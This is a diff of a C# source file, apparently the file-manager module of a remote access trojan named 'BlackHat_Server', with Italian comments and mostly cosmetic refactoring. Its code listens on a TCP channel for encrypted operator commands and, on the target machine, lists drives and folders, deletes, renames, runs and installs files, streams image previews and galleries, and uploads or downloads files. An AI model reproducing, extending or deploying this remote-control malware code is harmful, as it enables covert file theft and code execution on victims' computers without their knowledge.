@@ -1,26 +1,23 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Text;
 using System.Net.Sockets;
-using System.Windows.Forms;
+using System.Threading;
 
 namespace BlackHat_Server
 {
-    class FileManager
+    internal class FileManager
     {
+        private static bool closeFileManager;
+        private static bool closeImagePreview;
+        private static bool closeGalleryChannel;
+
+        private static bool isImageWorking;
+
+        private static bool isGalleryWorking;
+
         //NetworkStream myNetStream = null;
-        TcpClient myTcpClient = null;
+        private readonly TcpClient myTcpClient;
 
-        static bool closeFileManager = false;
-        static bool closeImagePreview = false;
-        static bool closeGalleryChannel = false;
-        
-        static bool isImageWorking = false;
-        static bool isGalleryWorking = false;
 
-        
-
-        
         public FileManager(TcpClient ctor_tcp)
         {
             myTcpClient = ctor_tcp;
@@ -28,28 +25,27 @@ namespace BlackHat_Server
 
 
         /// <summary>
-        /// Avvia un nuovo thread FileManager
+        ///     Avvia un nuovo thread FileManager
         /// </summary>
         public void StartFMThread()
         {
-            System.Threading.Thread t = new System.Threading.Thread(StartFileManager);
+            var t = new Thread(StartFileManager);
             t.IsBackground = true;
             t.Start();
         }
         //--------------------------------------
 
         /// <summary>
-        /// Esce dal Loop di ascolto
+        ///     Esce dal Loop di ascolto
         /// </summary>
         public void StopFileManager()
         {
             closeFileManager = true;
-            
         }
 
 
         /// <summary>
-        /// Esce dal Loop di ascolto
+        ///     Esce dal Loop di ascolto
         /// </summary>
         public void StopImagePreview()
         {
@@ -58,7 +54,7 @@ namespace BlackHat_Server
         }
 
         /// <summary>
-        /// Esce dal Loop di Gallery
+        ///     Esce dal Loop di Gallery
         /// </summary>
         public void StopGallery()
         {
@@ -67,22 +63,21 @@ namespace BlackHat_Server
         }
 
         /// <summary>
-        /// Thread Principale del FileManager.. Comunica tramite mainStream FileManager
-        /// Risponde a Listare file, eseguire file e aprire thread per trasmissione file!
+        ///     Thread Principale del FileManager.. Comunica tramite mainStream FileManager
+        ///     Risponde a Listare file, eseguire file e aprire thread per trasmissione file!
         /// </summary>
         private void StartFileManager()
-        {                        
+        {
             try
             {
-                MsgManager mm = new MsgManager(myTcpClient.GetStream());
+                var mm = new MsgManager(myTcpClient.GetStream());
 
                 while (!closeFileManager || !ST_Client.Instance.isConnected)
                 {
-                    string fmRequest = mm.WaitForEncryMessageRicorsive(10000);
+                    var fmRequest = mm.WaitForEncryMessageRicorsive(10000);
 
                     if (fmRequest != "TIMEOUT" && fmRequest != "_ERROR_")
                         Interpreter(fmRequest);
-                    
                 }
 
                 //  USCITO DA LOOP IL THREAD MUORE
@@ -93,7 +88,6 @@ namespace BlackHat_Server
                 // RIMUOVO DA LISTA
                 if (ST_Client.Instance.nsListaCanali.Contains(myTcpClient.GetStream()))
                     ST_Client.Instance.nsListaCanali.Remove(myTcpClient.GetStream());
-
             }
             catch (ObjectDisposedException)
             {
@@ -104,125 +98,112 @@ namespace BlackHat_Server
 
 
         /// <summary>
-        /// Interprete Del Messaggio Di richiesta
+        ///     Interprete Del Messaggio Di richiesta
         /// </summary>
         /// <param name="msg"></param>
         private void Interpreter(string msg)
         {
-            
-            string[] msgSplitted = msg.Split('|');
+            var msgSplitted = msg.Split('|');
             switch (msgSplitted[0])
             {
                 // LISTA I DRIVES
                 case "LIST_DRIVE":
-                    ListFiles lf = new ListFiles(myTcpClient.GetStream());
+                    var lf = new ListFiles(myTcpClient.GetStream());
                     lf.StartListDevices();
                     break;
 
                 // LISTA CARTELLE SPECIALI
                 case "LIST_SPECIAL":
-                    ListFiles lfd = new ListFiles(myTcpClient.GetStream());
+                    var lfd = new ListFiles(myTcpClient.GetStream());
                     lfd.StartListSpecial();
                     break;
 
                 // LISTA FILE IN DIR
                 case "LIST_CONTENT":
-                    string dir = msgSplitted[1];
-                    ListFiles lfdir = new ListFiles(myTcpClient.GetStream(), dir);
+                    var dir = msgSplitted[1];
+                    var lfdir = new ListFiles(myTcpClient.GetStream(), dir);
                     lfdir.StartListFile();
                     break;
-               
+
                 // LISTA FILE IN DIR
                 case "FILE_DELETE":
-                    FileManAction fma = new FileManAction(msgSplitted[1],myTcpClient.GetStream());
+                    var fma = new FileManAction(msgSplitted[1], myTcpClient.GetStream());
                     fma.StartDelFile();
                     break;
 
                 // LISTA RUN FILES
                 case "FILE_RUN":
-                    FileManAction fmarun = new FileManAction(msgSplitted[2], myTcpClient.GetStream());
+                    var fmarun = new FileManAction(msgSplitted[2], myTcpClient.GetStream());
                     fmarun.StartRunFiles(msgSplitted[1]);
                     break;
 
                 // RENAME FILE
                 case "FILE_RENAME":
-                    FileManAction fmren = new FileManAction(myTcpClient.GetStream());
-                    fmren.StartRename(msgSplitted[1],msgSplitted[2]);
+                    var fmren = new FileManAction(myTcpClient.GetStream());
+                    fmren.StartRename(msgSplitted[1], msgSplitted[2]);
                     break;
 
                 // CREATE NEW FOLDER
                 case "FILE_NEW_FOLDER":
-                    FileManAction fmaNF = new FileManAction(myTcpClient.GetStream());
-                    fmaNF.StartNewFolderCration(msgSplitted[1]);                    
+                    var fmaNF = new FileManAction(myTcpClient.GetStream());
+                    fmaNF.StartNewFolderCration(msgSplitted[1]);
                     break;
 
 
                 // INSTALL FILE
                 case "FILE_INSTALL":
-                    FileManAction fmaIF = new FileManAction(myTcpClient.GetStream());
+                    var fmaIF = new FileManAction(myTcpClient.GetStream());
                     fmaIF.StartInstallFile(msgSplitted[1], msgSplitted[2]);
                     break;
 
-                                   
 
-                    
-                    
                 // RICHIESTA DI CHIUSURA STREAM
                 case "CLOSE_CONNECTION":
                     StopFileManager();
                     StopImagePreview();
                     StopGallery();
-                   
-                    break;
-                default:
+
                     break;
             }
         }
         //----------------------------------------
 
 
-
-
-
-
-
-      
         /// <summary>
-        /// Avvia un nuovo thread Image PReview
+        ///     Avvia un nuovo thread Image PReview
         /// </summary>
         public void StartIMThread()
         {
-            System.Threading.Thread t = new System.Threading.Thread(StartImagePreviewManager);
+            var t = new Thread(StartImagePreviewManager);
             t.IsBackground = true;
             t.Start();
         }
         //--------------------------------------
 
         /// <summary>
-        /// Thread cominicazione invio image preview
+        ///     Thread cominicazione invio image preview
         /// </summary>
         private void StartImagePreviewManager()
         {
             try
             {
-                MsgManager mm = new MsgManager(myTcpClient.GetStream());
+                var mm = new MsgManager(myTcpClient.GetStream());
                 isImageWorking = true;
 
                 while (!closeImagePreview || !ST_Client.Instance.isConnected)
                 {
-                    string fmRequest = mm.WaitForEncryMessageRicorsive(10000);
+                    var fmRequest = mm.WaitForEncryMessageRicorsive(10000);
 
                     if (fmRequest != "TIMEOUT" && fmRequest != "_ERROR_")
                     {
-                        string[] msgSplitted = fmRequest.Split('|');
+                        var msgSplitted = fmRequest.Split('|');
 
                         if (msgSplitted[0] == "IMAGE_PREVIEW")
                         {
-                            FileManAction fmaIM = new FileManAction(myTcpClient.GetStream());
-                            fmaIM.StartImagePreview(msgSplitted[1]);    
+                            var fmaIM = new FileManAction(myTcpClient.GetStream());
+                            fmaIM.StartImagePreview(msgSplitted[1]);
                         }
                     }
-
                 }
 
                 //  USCITO DA LOOP IL THREAD MUORE
@@ -234,7 +215,6 @@ namespace BlackHat_Server
                 // RIMUOVO DA LISTA
                 if (ST_Client.Instance.nsListaCanali.Contains(myTcpClient.GetStream()))
                     ST_Client.Instance.nsListaCanali.Remove(myTcpClient.GetStream());
-
             }
             catch (ObjectDisposedException)
             {
@@ -245,44 +225,41 @@ namespace BlackHat_Server
         //--------------------------------------
 
 
-
-
         /// <summary>
-        /// Avvia un nuovo thread Image PReview
+        ///     Avvia un nuovo thread Image PReview
         /// </summary>
         public void StartGalleryThread()
         {
-            System.Threading.Thread t = new System.Threading.Thread(StartGalleryManager);
+            var t = new Thread(StartGalleryManager);
             t.IsBackground = true;
             t.Start();
         }
         //--------------------------------------
 
         /// <summary>
-        /// Thread cominicazione invio image preview
+        ///     Thread cominicazione invio image preview
         /// </summary>
         private void StartGalleryManager()
         {
             try
             {
-                MsgManager mm = new MsgManager(myTcpClient.GetStream());
+                var mm = new MsgManager(myTcpClient.GetStream());
                 isGalleryWorking = true;
 
                 while (!closeGalleryChannel || !ST_Client.Instance.isConnected)
                 {
-                    string fmRequest = mm.WaitForEncryMessageRicorsive(10000);
+                    var fmRequest = mm.WaitForEncryMessageRicorsive(10000);
 
                     if (fmRequest != "TIMEOUT" && fmRequest != "_ERROR_")
                     {
-                        string[] msgSplitted = fmRequest.Split('|');
+                        var msgSplitted = fmRequest.Split('|');
 
                         if (msgSplitted[0] == "IMAGE_GALLERY")
                         {
-                            FileManAction fmaIM = new FileManAction(myTcpClient.GetStream());
+                            var fmaIM = new FileManAction(myTcpClient.GetStream());
                             fmaIM.StartImageGallery(msgSplitted[1]);
                         }
                     }
-
                 }
 
                 //  USCITO DA LOOP IL THREAD MUORE
@@ -294,7 +271,6 @@ namespace BlackHat_Server
                 // RIMUOVO DA LISTA
                 if (ST_Client.Instance.nsListaCanali.Contains(myTcpClient.GetStream()))
                     ST_Client.Instance.nsListaCanali.Remove(myTcpClient.GetStream());
-                
             }
             catch (ObjectDisposedException)
             {
@@ -305,43 +281,40 @@ namespace BlackHat_Server
         //--------------------------------------
 
 
-
-
         /// <summary>
-        /// Avvia un nuovo thread Per invio File
+        ///     Avvia un nuovo thread Per invio File
         /// </summary>
         public void StartTransfThread()
         {
-            System.Threading.Thread t = new System.Threading.Thread(TransfThread);
+            var t = new Thread(TransfThread);
             t.IsBackground = true;
             t.Start();
         }
         //--------------------------------------
 
         /// <summary>
-        ///
         /// </summary>
         private void TransfThread()
         {
             try
             {
-                MsgManager mm = new MsgManager(myTcpClient.GetStream());
-                                               
-                string fmRequest = mm.WaitForEncryMessageRicorsive(15000); // ASPETTO LA RICHIESTA DEL FILE PER 15 SEC
+                var mm = new MsgManager(myTcpClient.GetStream());
+
+                var fmRequest = mm.WaitForEncryMessageRicorsive(15000); // ASPETTO LA RICHIESTA DEL FILE PER 15 SEC
 
                 if (fmRequest != "TIMEOUT" && fmRequest != "_ERROR_")
                 {
-                    string[] msgSplitted = fmRequest.Split('|');
+                    var msgSplitted = fmRequest.Split('|');
 
                     if (msgSplitted[0] == "TRANSFER")
                     {
-                        FileManAction fmaIM = new FileManAction(myTcpClient.GetStream());
+                        var fmaIM = new FileManAction(myTcpClient.GetStream());
                         fmaIM.SendFileTrans(msgSplitted[1]);
                     }
 
                     if (msgSplitted[0] == "UPLOAD")
                     {
-                        FileManAction fmaIM = new FileManAction(myTcpClient.GetStream());
+                        var fmaIM = new FileManAction(myTcpClient.GetStream());
                         fmaIM.ReceiveFile(msgSplitted[1]);
                     }
                 }
@@ -353,9 +326,6 @@ namespace BlackHat_Server
                 // RIMUOVO DA LISTA
                 if (ST_Client.Instance.nsListaCanali.Contains(myTcpClient.GetStream()))
                     ST_Client.Instance.nsListaCanali.Remove(myTcpClient.GetStream());
-
-
-                
             }
             catch (ObjectDisposedException)
             {
@@ -364,11 +334,5 @@ namespace BlackHat_Server
             }
         }
         //--------------------------------------
-
-
-
-
-        
-
     }
 }
